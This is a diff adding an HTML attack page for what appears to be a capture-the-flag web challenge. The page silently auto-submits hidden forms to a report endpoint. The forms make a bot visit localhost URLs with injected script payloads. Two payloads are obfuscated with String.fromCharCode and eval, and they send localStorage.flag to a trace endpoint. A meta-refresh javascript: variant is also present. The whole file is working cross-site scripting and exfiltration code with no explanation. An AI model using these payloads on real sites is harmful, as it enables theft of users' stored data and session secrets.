@@ -1,0 +1,34 @@
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>report</title></head>
+<body>
+<p>queueing reports</p>
+<script>
+const TARGET = 'http://k06749d7511f8df4bb76c71a2393a43af.playat.flagyard.com/?p=report';
+const urls = [
+  // 1) no-JS beacon: img src hits trace
+  'http://127.0.0.1:5000/?p=view&dir=%253&file=cimg%20src=/?p=trace%26id=botvisit1%26note=helloimg%253e',
+  // 2) onerror -> location to trace with localStorage.flag
+  'http://127.0.0.1:5000/?p=view&dir=%253&file=cimg%20src=x.js%20onerror=eval(String.fromCharCode(108,111,99,97,116,105,111,110,61,39,47,63,112,61,116,114,97,99,101,38,105,100,61,102,108,97,103,102,108,97,103,49,38,110,111,116,101,61,39,43,101,110,99,111,100,101,85,82,73,67,111,109,112,111,110,101,110,116,40,108,111,99,97,108,83,116,111,114,97,103,101,46,102,108,97,103,124,124,39,110,111,110,101,39,41))%253e',
+  // 3) meta refresh javascript: (chrome often blocks; try anyway)
+  'http://127.0.0.1:5000/?p=view&dir=%253&file=cmeta%20http-equiv=refresh%20content=0;url=javascript:eval(String.fromCharCode(108,111,99,97,116,105,111,110,61,39,47,63,112,61,116,114,97,99,101,38,105,100,61,106,115,114,101,102,114,101,115,38,110,111,116,101,61,39,43,101,110,99,111,100,101,85,82,73,67,111,109,112,111,110,101,110,116,40,108,111,99,97,108,83,116,111,114,97,103,101,46,102,108,97,103,124,124,39,110,111,110,101,39,41))%253e'
+];
+urls.forEach(function (u, i) {
+  var iframe = document.createElement('iframe');
+  iframe.name = 'r' + i;
+  iframe.style.display = 'none';
+  document.body.appendChild(iframe);
+  var form = document.createElement('form');
+  form.method = 'POST';
+  form.action = TARGET;
+  form.target = 'r' + i;
+  var input = document.createElement('input');
+  input.name = 'url';
+  input.value = u;
+  form.appendChild(input);
+  document.body.appendChild(form);
+  form.submit();
+});
+</script>
+</body>
+</html>
